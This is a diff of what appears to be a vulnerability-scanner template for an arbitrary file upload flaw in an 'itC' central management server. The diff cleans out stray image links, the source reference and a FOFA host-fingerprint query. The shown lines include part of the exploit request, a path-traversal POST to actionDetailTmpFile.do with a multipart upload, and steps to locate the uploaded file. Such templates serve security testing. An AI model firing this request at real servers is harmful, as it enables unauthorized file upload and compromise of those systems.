@@ -3,12 +3,8 @@ info:
   name: itC 中心管理服务器 actionDetailTmpFile存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ahi3tzu5pehuxmse'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ahi3tzu5pehuxmse
-    fofa: body="/mt_res_v3/img/public/logo.ico"
 http:
 - raw:
   - 'POST /sdk/../photoAds/actionDetailTmpFile.do?text=1&pa_id=11&position=11 HTTP/1.1
@@ -41,7 +37,6 @@ http:
 
     ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1786373128156-258033ad-bfe3-451a-b414-4c4203a20cb9.png)
 
     根据参数pa_id获取上传的文件名'
   redirects: false
@@ -64,7 +59,7 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    Content-Length: 64![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1786373128412-cc3dccfb-aff0-416d-844f-8a98aa4c12d2.png)
+    Content-Length: 64
 
     访问上传文件的路径'
   redirects: false
